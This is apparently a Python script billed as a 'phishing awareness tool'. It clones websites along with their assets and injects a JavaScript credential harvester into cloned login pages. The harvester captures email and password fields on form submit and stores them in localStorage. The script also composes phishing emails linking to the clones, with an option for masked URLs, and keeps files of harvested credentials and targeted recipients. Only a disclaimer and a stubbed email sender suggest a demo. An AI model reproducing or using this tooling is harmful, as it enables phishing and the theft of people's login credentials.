import os
import requests
import json
import time
import sys
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from io import StringIO
import re

# COMPLETELY BYPASS Windows console encoding issues
# Force everything to ASCII-only for console output
os.environ['PYTHONIOENCODING'] = 'ascii'
sys.stdout = open(sys.stdout.fileno(), 'w', encoding='ascii', errors='ignore')
sys.stderr = open(sys.stderr.fileno(), 'w', encoding='ascii', errors='ignore')

# Configuration
CONFIG = {
    "harvested_credentials_file": "harvested_credentials.json",
    "cloned_websites_dir": "cloned_websites",
    "email_log_file": "email_log.json",
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "timeout": 30,
    "max_retries": 3
}

def safe_print(message):
    """Print only ASCII characters, ignore everything else"""
    # Convert to ASCII, replacing non-ASCII with nothing
    ascii_message = message.encode('ascii', 'ignore').decode('ascii')
    print(ascii_message)

def setup_environment():
    """Set up necessary directories and files"""
    os.makedirs(CONFIG["cloned_websites_dir"], exist_ok=True)
    if not os.path.exists(CONFIG["harvested_credentials_file"]):
        with open(CONFIG["harvested_credentials_file"], "w", encoding="utf-8") as f:
            json.dump([], f)
    if not os.path.exists(CONFIG["email_log_file"]):
        with open(CONFIG["email_log_file"], "w", encoding="utf-8") as f:
            json.dump([], f)

def clean_html_content(html):
    """Remove ALL non-ASCII and problematic characters from HTML"""
    # Keep only ASCII characters (0-127)
    html = html.encode('ascii', 'ignore').decode('ascii')
    
    # Remove control characters except newline and tab
    html = ''.join(char for char in html if ord(char) >= 32 or char in '\n\r\t')
    
    # Remove common problematic patterns
    html = re.sub(r'[\x00-\x1f\x7f-\x9f]', '', html)
    
    return html

def save_credentials(email, password, source_url):
    """Save harvested credentials to a JSON file"""
    try:
        with open(CONFIG["harvested_credentials_file"], "r", encoding="utf-8") as f:
            data = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        data = []

    credentials = {
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "email": email,
        "password": password,
        "source_url": source_url
    }

    data.append(credentials)

    try:
        with open(CONFIG["harvested_credentials_file"], "w", encoding="utf-8") as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        safe_print(f"[OK] Credentials saved from {source_url}")
    except Exception as e:
        safe_print(f"[ERROR] Failed to save credentials: {e}")

def get_url_content(url):
    """Fetch URL content with retries and proper encoding handling"""
    session = requests.Session()
    session.headers.update({'User-Agent': CONFIG["user_agent"]})

    for attempt in range(CONFIG["max_retries"]):
        try:
            response = session.get(url, timeout=CONFIG["timeout"])
            response.raise_for_status()

            # Force UTF-8 encoding
            response.encoding = 'utf-8'
            html = response.text
            
            # Clean IMMEDIATELY after getting content
            html = clean_html_content(html)
            return html
        except requests.exceptions.RequestException as e:
            if attempt == CONFIG["max_retries"] - 1:
                raise
            time.sleep(1)

    return None

def download_asset(url, output_path):
    """Download a single asset (CSS, JS, image)"""
    try:
        session = requests.Session()
        session.headers.update({'User-Agent': CONFIG["user_agent"]})

        response = session.get(url, timeout=CONFIG["timeout"], stream=True)
        response.raise_for_status()

        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        with open(output_path, "wb") as f:
            for chunk in response.iter_content(1024):
                f.write(chunk)
        return True
    except Exception as e:
        # Don't print asset errors to avoid noise
        return False

def process_assets(soup, base_url, output_dir):
    """Process and download all assets (CSS, JS, images)"""
    asset_selectors = [
        ('link[rel="stylesheet"]', 'href', 'css'),
        ('script[src]', 'src', 'js'),
        ('img[src]', 'src', 'images'),
    ]

    for selector, attr, subdir in asset_selectors:
        for element in soup.select(selector):
            url = element.get(attr)
            if not url or url.startswith(('data:', 'javascript:', 'mailto:', 'tel:')):
                continue

            absolute_url = urljoin(base_url, url)
            filename = os.path.basename(urlparse(absolute_url).path)

            if not filename or '.' not in filename:
                filename = f"asset_{hash(absolute_url)}.bin"

            output_path = os.path.join(output_dir, subdir, filename)

            if download_asset(absolute_url, output_path):
                element[attr] = os.path.join(subdir, filename).replace("\\", "/")

def get_list_of_cloned_sites():
    """Get a list of all cloned websites"""
    sites = []
    if os.path.exists(CONFIG["cloned_websites_dir"]):
        for item in os.listdir(CONFIG["cloned_websites_dir"]):
            item_path = os.path.join(CONFIG["cloned_websites_dir"], item)
            if os.path.isdir(item_path) and os.path.exists(os.path.join(item_path, "index.html")):
                sites.append(item)
    return sites

def send_phishing_email():
    """Send a phishing email (educational demo)"""
    safe_print("\n[EMAIL] Prepare Phishing Email")
    
    sender = input("[FROM] Sender email: ").strip()
    receiver = input("[TO] Receiver email: ").strip()
    subject = input("[SUBJECT] Subject: ").strip()
    body = input("[BODY] Body (use {url} for link): ").strip()
    
    use_cloudflare = input("[CLOUDFLARE] Use Cloudflare masking? (y/n): ").strip().lower() == 'y'
    
    sites = get_list_of_cloned_sites()
    
    if not sites:
        safe_print("[ERROR] No cloned websites found. Clone a website first (option 1).")
        return
    
    safe_print("\n[AVAILABLE SITES]")
    for i, site in enumerate(sites, 1):
        safe_print(f"  {i}. {site}")
    
    try:
        selection = int(input("[SELECT] Choose number: ").strip())
        if selection < 1 or selection > len(sites):
            safe_print("[ERROR] Invalid selection.")
            return
        selected_site = sites[selection - 1]
    except ValueError:
        safe_print("[ERROR] Invalid input.")
        return
    
    if use_cloudflare:
        phishing_url = f"https://secure.localhost:8080.cf/{selected_site}/index.html"
    else:
        phishing_url = f"http://localhost:8000/{selected_site}/index.html"
    
    final_body = body.replace("{url}", phishing_url)
    
    safe_print("\n[EMAIL PREVIEW]")
    safe_print("=" * 50)
    safe_print(f"From: {sender}")
    safe_print(f"To: {receiver}")
    safe_print(f"Subject: {subject}")
    safe_print(f"Body:\n{final_body}")
    safe_print("=" * 50)
    safe_print(f"[PHISHING URL] {phishing_url}")
    
    email_log = {
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "sender": sender,
        "receiver": receiver,
        "subject": subject,
        "body": final_body,
        "phishing_url": phishing_url,
        "cloned_site": selected_site
    }
    
    try:
        with open(CONFIG["email_log_file"], "r", encoding="utf-8") as f:
            logs = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        logs = []
    
    logs.append(email_log)
    
    with open(CONFIG["email_log_file"], "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)
    
    safe_print("\n[DEMO MODE] Email would be sent via SMTP in production.")
    safe_print("[NOTE] For educational purposes only!")

def clone_website(url):
    """Clone a website including its assets - FIXED for encoding issues"""
    try:
        safe_print(f"[CLONING] {url}")

        # Create safe directory name (remove special chars)
        domain = urlparse(url).netloc.replace("www.", "")
        domain = re.sub(r'[^a-zA-Z0-9.-]', '_', domain)
        output_dir = os.path.join(CONFIG["cloned_websites_dir"], domain)
        counter = 1
        while os.path.exists(output_dir):
            output_dir = os.path.join(CONFIG["cloned_websites_dir"], f"{domain}_{counter}")
            counter += 1
        os.makedirs(output_dir, exist_ok=True)

        # Create subdirectories
        for subdir in ['css', 'js', 'images', 'media']:
            os.makedirs(os.path.join(output_dir, subdir), exist_ok=True)

        # Get and clean HTML content
        html_content = get_url_content(url)
        if not html_content:
            raise Exception("Failed to fetch HTML content")

        # Parse with BeautifulSoup
        soup = BeautifulSoup(html_content, 'html.parser')

        # Process assets
        process_assets(soup, url, output_dir)

        # Add credential harvester for login pages
        if any(x in url.lower() for x in ['login', 'signin', 'auth', 'account']):
            add_credential_harvester(soup, url)

        # Save HTML
        html_output = str(soup)
        html_output = clean_html_content(html_output)

        with open(os.path.join(output_dir, "index.html"), "w", encoding="utf-8", errors='ignore') as f:
            f.write(html_output)

        safe_print(f"[SUCCESS] Website saved in: {output_dir}")
        return output_dir

    except Exception as e:
        # Convert error to ASCII-only
        error_msg = str(e)
        clean_error = error_msg.encode('ascii', 'ignore').decode('ascii')
        safe_print(f"[ERROR] Clone failed: {clean_error}")
        return None

def add_credential_harvester(soup, source_url):
    """Add JavaScript to harvest credentials"""
    harvest_script = """
    <script>
    document.addEventListener('DOMContentLoaded', function() {
        const forms = document.querySelectorAll('form');
        forms.forEach(form => {
            const originalSubmit = form.onsubmit;
            form.onsubmit = function(e) {
                const formData = new FormData(form);
                const email = formData.get('email') || formData.get('username') || '';
                const password = formData.get('password') || '';
                if (email && password) {
                    console.log('[DEMO] Credentials:', {email, password});
                    let harvested = JSON.parse(localStorage.getItem('creds') || '[]');
                    harvested.push({email: email, password: password, time: new Date().toISOString()});
                    localStorage.setItem('creds', JSON.stringify(harvested));
                }
                if (originalSubmit) return originalSubmit.call(form, e);
                return true;
            };
        });
    });
    </script>
    """
    script_tag = soup.new_tag("script")
    script_tag.string = harvest_script
    if soup.head:
        soup.head.append(script_tag)
    else:
        soup.html.insert(0, script_tag)

def view_harvested_credentials():
    """View harvested credentials"""
    try:
        with open(CONFIG["harvested_credentials_file"], "r", encoding="utf-8") as f:
            credentials = json.load(f)

        if not credentials:
            safe_print("No credentials harvested yet.")
        else:
            safe_print("\n[CREDENTIALS]")
            safe_print("=" * 60)
            for i, cred in enumerate(credentials, 1):
                safe_print(f"[{i}] {cred.get('timestamp', 'N/A')}")
                safe_print(f"  Email: {cred.get('email', 'N/A')}")
                safe_print(f"  Password: {cred.get('password', 'N/A')}")
                safe_print(f"  Source: {cred.get('source_url', 'N/A')}")
                safe_print("-" * 60)
    except Exception as e:
        safe_print(f"[ERROR] Reading credentials: {e}")

def main():
    """Main menu loop"""
    setup_environment()

    safe_print("""
    [WARNING] Educational & Authorized Testing Only!
    Unauthorized use is ILLEGAL.
    """)
   

    while True:
        safe_print("""
    [PHISHING AWARENESS TOOL]
    -------------------------
    [1] Clone Website
    [2] Send Email (Demo)
    [3] View Credentials
    [4] View Email Logs
    [5] Exit
    """)

        try:
            choice = input("> ").strip()

            if choice == "1":
                url = input("[URL] Enter website URL: ").strip()
                if not url.startswith(('http://', 'https://')):
                    safe_print("[ERROR] Invalid URL. Include http:// or https://")
                    continue
                clone_website(url)

            elif choice == "2":
                send_phishing_email()

            elif choice == "3":
                view_harvested_credentials()

            elif choice == "4":
                try:
                    with open(CONFIG["email_log_file"], "r", encoding="utf-8") as f:
                        logs = json.load(f)
                    if logs:
                        safe_print("\n[EMAIL LOGS]")
                        for i, log in enumerate(logs, 1):
                            safe_print(f"[{i}] {log.get('timestamp', 'N/A')} - To: {log.get('receiver', 'N/A')}")
                    else:
                        safe_print("No email logs found.")
                except Exception as e:
                    safe_print(f"[ERROR] Reading logs: {e}")

            elif choice == "5":
                safe_print("Exiting...")
                break

            else:
                safe_print("Invalid choice.")

        except KeyboardInterrupt:
            safe_print("\nCancelled.")
            continue
        except Exception as e:
            safe_print(f"[ERROR] {e}")

    

if __name__ == "__main__":
    main()
